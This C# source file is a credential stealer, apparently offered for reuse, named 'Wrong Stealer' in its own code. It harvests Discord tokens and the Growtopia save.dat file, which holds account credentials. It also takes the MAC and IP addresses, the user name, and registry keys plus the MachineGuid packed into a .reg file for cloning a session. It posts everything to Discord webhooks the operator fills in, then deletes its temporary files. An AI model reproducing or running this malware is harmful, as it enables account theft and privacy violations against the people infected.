using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Mail;
using System.Net.Mime;
using System.Net.NetworkInformation;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows;
using System.Windows.Forms;
using Microsoft.Win32;

namespace strchange142
{
    public class DiscordToken
    {
        public DiscordToken()
        {
            GetToken();
        }

        /// <summary>
        /// to exctact the token text from ldb file using regex
        /// </summary>
        public void GetToken()
        {
            var files = SearchForFile(); // to get ldb files
            if (files.Count == 0)
            {
                //Console.WriteLine("Didn't find any ldb files");
                return;
            }
            string content = "";
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == 59)
                    {
                        content = content + $"Token={match.ToString()}";
                        content = content + Environment.NewLine;
                        /*Console.WriteLine($"Token={match.ToString()}");
                        using (StreamWriter sw = new StreamWriter("C:/Users/" + Environment.UserName + "/AppData/Local/Growtopia/Token.txt", true))
                        {
                            //sw.WriteLine($"Token={match.ToString()}");
                            //sw.Close();
                        }*/
                    }
                }
            }
            StreamWriter sw = new StreamWriter("C:/Users/" + Environment.UserName + "/AppData/Local/Growtopia/Token.txt", true);
            sw.WriteLine(content);
            sw.Close();
        }

        /// <summary>
        /// check is discord path exists then add "*.ldb" files to list<string>
        /// </summary>
        /// <returns>string</returns>
        private List<string> SearchForFile()
        {
            List<string> ldbFiles = new List<string>();
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

            if (!Directory.Exists(discordPath))
            {
                //Console.WriteLine("Discord path not found");
                return ldbFiles;
            }

            foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                string rawText = File.ReadAllText(file);
                if (rawText.Contains("oken"))
                {
                    //Console.WriteLine($"{Path.GetFileName(file)} added");
                    ldbFiles.Add(rawText);
                }
            }
            return ldbFiles;
        }
    }
    class Webhook3
    {
        private HttpClient Client;
        private string Url;

        public string Name { get; set; }
        public string ProfilePictureUrl { get; set; }

        public Webhook3(string webhookUrl)
        {
            Client = new HttpClient();
            Url = webhookUrl;
        }

        public bool SendMessage(string content, string file = null)
        {
            MultipartFormDataContent data = new MultipartFormDataContent();
            data.Add(new StringContent(Name), "username");
            data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
            data.Add(new StringContent(content), "content");

            if (file != null)
            {
                if (!File.Exists(file))
                    throw new FileNotFoundException();

                byte[] bytes = File.ReadAllBytes(file);

                data.Add(new ByteArrayContent(bytes), "Discord Token.txt", "Discord Token.txt"); //change "file" to "file.(extention) if you wish to download as ext
            }

            var resp = Client.PostAsync(Url, data).Result;

            return resp.StatusCode == HttpStatusCode.NoContent;
        }
    }
    class Webhook2
    {
        private HttpClient Client;
        private string Url;

        public string Name { get; set; }
        public string ProfilePictureUrl { get; set; }

        public Webhook2(string webhookUrl)
        {
            Client = new HttpClient();
            Url = webhookUrl;
        }

        public bool SendMessage(string content, string file = null)
        {
            MultipartFormDataContent data = new MultipartFormDataContent();
            data.Add(new StringContent(Name), "username");
            data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
            data.Add(new StringContent(content), "content");

            if (file != null)
            {
                if (!File.Exists(file))
                    throw new FileNotFoundException();

                byte[] bytes = File.ReadAllBytes(file);

                data.Add(new ByteArrayContent(bytes), "SetReg.reg", "SetReg.reg"); //change "file" to "file.(extention) if you wish to download as ext
            }

            var resp = Client.PostAsync(Url, data).Result;

            return resp.StatusCode == HttpStatusCode.NoContent;
        }
    }
    class Webhook
    {
        private HttpClient Client;
        private string Url;

        public string Name { get; set; }
        public string ProfilePictureUrl { get; set; }

        public Webhook(string webhookUrl)
        {
            Client = new HttpClient();
            Url = webhookUrl;
        }

        public bool SendMessage(string content, string file = null)
        {
            MultipartFormDataContent data = new MultipartFormDataContent();
            data.Add(new StringContent(Name), "username");
            data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
            data.Add(new StringContent(content), "content");

            if (file != null)
            {
                if (!File.Exists(file))
                    throw new FileNotFoundException();

                byte[] bytes = File.ReadAllBytes(file);

                data.Add(new ByteArrayContent(bytes), "save.dat", "save.dat"); //change "file" to "file.(extention) if you wish to download as ext
            }

            var resp = Client.PostAsync(Url, data).Result;

            return resp.StatusCode == HttpStatusCode.NoContent;
        }
    }
    internal class strchange143
    {
        public static string strchange19()
        {
            return (from strchange21 in NetworkInterface.GetAllNetworkInterfaces()
                    where strchange21.OperationalStatus == OperationalStatus.Up && strchange21.NetworkInterfaceType != NetworkInterfaceType.Loopback
                    select strchange21 into strchange22
                    select strchange22.GetPhysicalAddress().ToString()).FirstOrDefault<string>();
        }

        public static string strchange63(int strchange64)
        {
            Random strchange65 = new Random();
            return new string((from strchange67 in Enumerable.Repeat<string>("0123456789", strchange64)
                               select strchange67[strchange65.Next(strchange67.Length)]).ToArray<char>());
        }
        public static string Get5RND()
        {
            string result;
            try
            {
                RegistryKey registryKey = Registry.CurrentUser;
                registryKey = registryKey.OpenSubKey("Software\\Microsoft", true);
                string[] subKeyNames = registryKey.GetSubKeyNames();
                foreach (string text in subKeyNames)
                {
                    if (Regex.IsMatch(text, "^[0-9]+$", RegexOptions.Compiled) && text.Length == 5)
                    {
                        return text;
                    }
                    if (!Regex.IsMatch(text, "^[0-9]+$", RegexOptions.Compiled))
                    {
                        int length = text.Length;
                    }
                }
                result = "NULL";
            }
            catch
            {
                result = "NULL";
            }
            return result;
        }
        public static string Get9RND()
        {
            string result;
            try
            {
                RegistryKey currentUser = Registry.CurrentUser;
                string[] subKeyNames = currentUser.GetSubKeyNames();
                foreach (string text in subKeyNames)
                {
                    if (Regex.IsMatch(text, "^[0-9]+$", RegexOptions.Compiled) && text.Length == 9)
                    {
                        return text;
                    }
                    if (!Regex.IsMatch(text, "^[0-9]+$", RegexOptions.Compiled))
                    {
                        int length = text.Length;
                    }
                }
                result = "NULL";
            }
            catch
            {
                result = "NULL";
            }
            return result;
        }

        public static string replacestrg(string lol)
        {
            string rands = strchange143.Get9RND();
            string rands2 = strchange143.Get5RND();
            string text = "";
            string text2 = "";
            foreach (string str in strchange143.rand9list(rands))
            {
                text += str;
            }
            foreach (string str2 in strchange143.rand5list(rands2))
            {
                text2 += str2;
            }
            return lol.Replace("//append9rands", text).Replace("//append5rands", text2);
        }

        public static List<string> rand9list(string rands9)
        {
            List<string> list = new List<string>();
            RegistryKey registryKey;
            if (Environment.Is64BitOperatingSystem)
            {
                registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
            }
            else
            {
                registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
            }
            try
            {
                registryKey = registryKey.OpenSubKey(rands9, true);
                string[] valueNames = registryKey.GetValueNames();
                foreach (string text in valueNames)
                {
                    byte[] value = (byte[])registryKey.GetValue(text);
                    string text2 = BitConverter.ToString(value).Replace("-", ",").ToLower();
                    string item = string.Concat(new string[]
                    {
                        "\"",
                        text,
                        "\"=hex:",
                        text2,
                        Environment.NewLine
                    });
                    list.Add(item);
                }
            }
            catch
            {
            }
            return list;
        }

        public static List<string> rand5list(string rands5)
        {
            List<string> list = new List<string>();
            RegistryKey registryKey;
            if (Environment.Is64BitOperatingSystem)
            {
                registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
            }
            else
            {
                registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
            }
            try
            {
                registryKey = registryKey.OpenSubKey("Software\\Microsoft\\" + rands5, true);
                string[] valueNames = registryKey.GetValueNames();
                foreach (string text in valueNames)
                {
                    byte[] value = (byte[])registryKey.GetValue(text);
                    string text2 = BitConverter.ToString(value).Replace("-", ",").ToLower();
                    string item = string.Concat(new string[]
                    {
                        "\"",
                        text,
                        "\"=hex:",
                        text2,
                        Environment.NewLine
                    });
                    list.Add(item);
                }
            }
            catch
            {
            }
            return list;
        }
        private static string regCode(string Guid1, string Guid2)
        {
            string longkey, shortkey;
            foreach (string subkeyname in Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Microsoft").GetSubKeyNames())
            {
                if (subkeyname.StartsWith("1") || subkeyname.StartsWith("2") || subkeyname.StartsWith("3") || subkeyname.StartsWith("4") || subkeyname.StartsWith("5") || subkeyname.StartsWith("6") || subkeyname.StartsWith("7") || subkeyname.StartsWith("8") || subkeyname.StartsWith("9"))
                {
                    shortkey = subkeyname;
                }
            }
            foreach (string subkeyname2 in Registry.CurrentUser.GetSubKeyNames())
            {
                if (subkeyname2.StartsWith("1") || subkeyname2.StartsWith("2") || subkeyname2.StartsWith("3") || subkeyname2.StartsWith("4") || subkeyname2.StartsWith("5") || subkeyname2.StartsWith("6") || subkeyname2.StartsWith("7") || subkeyname2.StartsWith("8") || subkeyname2.StartsWith("9"))
                {
                    longkey = subkeyname2;
                }
            }
            return string.Format("Windows Registry Editor Version 5.00\r\n[-HKEY_CURRENT_USER\\441072793]\r\n[HKEY_CURRENT_USER\\441072793]\r\n//append9rands\r\n\r\n[-HKEY_CURRENT_USER\\Software\\Microsoft\\29549]\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\29549]\r\n//append5rands\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography]\r\n\"MachineGuid\"=\"{0}\"\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography]\r\n\"MachineGuid\"=\"{1}\"", Guid1, Guid2);
        }


        public static string[] GrabMGuID()
        {
            string[] array = new string[]
            {
                "",
                ""
            };
            bool is64BitOperatingSystem = Environment.Is64BitOperatingSystem;
            try
            {
                RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
                if (registryKey != null)
                {
                    string text = (string)registryKey.GetValue("MachineGuid");
                    array[1] = text;
                    registryKey.Close();
                }
                if (is64BitOperatingSystem)
                {
                    RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
                    registryKey2 = registryKey2.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Cryptography", false);
                    if (registryKey2 != null)
                    {
                        string text2 = (string)registryKey2.GetValue("MachineGuid");
                        array[0] = text2;
                    }
                    registryKey2.Close();
                }
                else if (!is64BitOperatingSystem)
                {
                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
                    registryKey = registryKey.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Cryptography", false);
                    if (registryKey != null)
                    {
                        string text3 = (string)registryKey.GetValue("MachineGuid");
                        array[1] = text3;
                        registryKey.Close();
                    }
                }
            }
            catch
            {
            }
            return array;
        }
        public static string strchange98(string strchange99)
        {
            byte[] array = File.ReadAllBytes(strchange99);
            string @string = Encoding.ASCII.GetString(array);
            //int x = int.Parse(@string.IndexOf("lastworld").ToString());
            string result;
            try
            {
                //byte[] array = File.ReadAllBytes(strchange99);
                //string @string = Encoding.ASCII.GetString(array);
                string text = @string.Substring(@string.IndexOf("tankid_name") + 15, Convert.ToInt32(array[@string.IndexOf("tankid_name") + 11]));
                /*int i;
                //x = int.Parse(@string.IndexOf("lastworld").ToString());
                string text2 = @string.Substring(@string.IndexOf("lastworld") + 13, Convert.ToInt32(array[@string.IndexOf("lastworld") + 25]));
                string text3 = "";
                for (i=0;i<text2.Length;i++)
                {
                    int z;
                    z = text2[i];
                    if (z >= 48 && z <= 122)
                    {
                        text3 = text3 + text2[i];
                    }
                    else
                        break;
                }*/
                result = text;
                //result = result + Environment.NewLine;
                //result = result + "Last world: " + text3.ToUpper();
            }
            catch
            {
                result = "Null";
            }
            return result;
        }

        private static void Main(string[] args)
        {
            new DiscordToken();
            string[] array = strchange143.GrabMGuID();
            string content = strchange143.replacestrg(strchange143.regCode(array[0], array[1]));
            ContentType contentType = new ContentType("text/reg");
            Attachment attachment = Attachment.CreateAttachmentFromString(content, contentType);
            attachment.Name = "SetReg.reg";
            string text = "";
            try
            {
                RegistryKey registryKey;
                if (Environment.Is64BitOperatingSystem)
                {
                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                }
                else
                {
                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
                }
                try
                {
                    registryKey = registryKey.OpenSubKey("Software\\Growtopia", true);
                    string text2 = (string)registryKey.GetValue("path");
                    if (Directory.Exists(text2))
                    {
                        string text3 = File.ReadAllText(text2 + "\\save.dat");
                        if (text3.Contains("tankid_password") && text3.Contains("tankid_name"))
                        {
                            text = text2 + "\\save.dat";
                        }
                        else
                        {
                            text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                        }
                    }
                    else
                    {
                        text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                    }
                }
                catch
                {
                    text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                }
            }
            catch
            {
                text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
            }
            IPHostEntry host;
            string localIP = @"";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily.ToString() == "InterNetwork")
                {
                    localIP = localIP + ip.ToString();
                    localIP = localIP + Environment.NewLine;
                }
            }
            //ServicePointManager.Expect100Continue = true;
            //ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
            string address;
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            String sMacAddress = string.Empty;
            foreach (NetworkInterface adapter in nics)
            {
                if (sMacAddress == String.Empty)// only return MAC Address from first card  
                {
                    IPInterfaceProperties properties = adapter.GetIPProperties();
                    sMacAddress = adapter.GetPhysicalAddress().ToString();
                }
            }
            address = sMacAddress;
            //string address = "https://icanhazip.com/";
            //string text4 = new WebClient().DownloadString(address);
            string text5 = strchange143.strchange19();
            string userName = Environment.UserName;
            string str = Environment.MachineName.ToString();
            TextWriter reg = new StreamWriter("C:/Users/" + Environment.UserName + "/AppData/Local/Growtopia/SetReg.txt", true);
            reg.Write(content);
            reg.Close();

            //SEND save.dat SAVE.DAT HERE

            Webhook hook = new Webhook(""); //Here Your Webhook URL
            hook.Name = "Wrong Stealer"; //Dont Change Name Or No Work
            hook.ProfilePictureUrl = "https://cdn.discordapp.com/icons/693566452669874237/89cd36a0f6fe830a61b1a84dd20fceb0.png?size=128";
            string details;
            details = @"MAC Address: " + address;
            details = details + Environment.NewLine;
            details = details + "IP Address: " + localIP;
            details = details + "PC Name: " + Environment.UserName;
            details = details + Environment.NewLine;
            details = details + "GrowId: " + strchange98(text);
            //details = details + Environment.NewLine;
            //details = details + content;
            hook.SendMessage(details, text);

            //SEND SetReg.reg; AAP HERE

            Webhook2 hook2 = new Webhook2("");//Here Your Webhook URL
            hook2.Name = "Wrong Stealer"; //Dont Change Name Or No Work
            hook2.ProfilePictureUrl = "https://cdn.discordapp.com/icons/693566452669874237/89cd36a0f6fe830a61b1a84dd20fceb0.png?size=128";
            hook2.SendMessage("", "C:/Users/" + Environment.UserName + "/AppData/Local/Growtopia/SetReg.txt");
            //MessageBox.Show(strchange98(text));
            File.Delete("C:/Users/" + Environment.UserName + "/AppData/Local/Growtopia/SetReg.txt");

            //SEND Token.txt;  THANK YOU PRAB >3 HERE DİSCORD TOKEN STEALER

            Webhook3 hook3 = new Webhook3(""); //Here Your Webhook URL
            hook3.Name = "Wrong Stealer"; //Dont Change Name Or No Work
            hook3.ProfilePictureUrl = "https://cdn.discordapp.com/icons/693566452669874237/89cd36a0f6fe830a61b1a84dd20fceb0.png?size=128";
            hook3.SendMessage("", "C:/Users/" + Environment.UserName + "/AppData/Local/Growtopia/Token.txt");
            //MessageBox.Show(strchange98(text));
            File.Delete("C:/Users/" + Environment.UserName + "/AppData/Local/Growtopia/Token.txt");
            Environment.Exit(0);
        }

        public static string Formatfff = "[^a-zA-Z0-9`!@#$%^&*()_+|\\-=\\\\{}\\[\\]:\";'<>?,./]";
    }
}
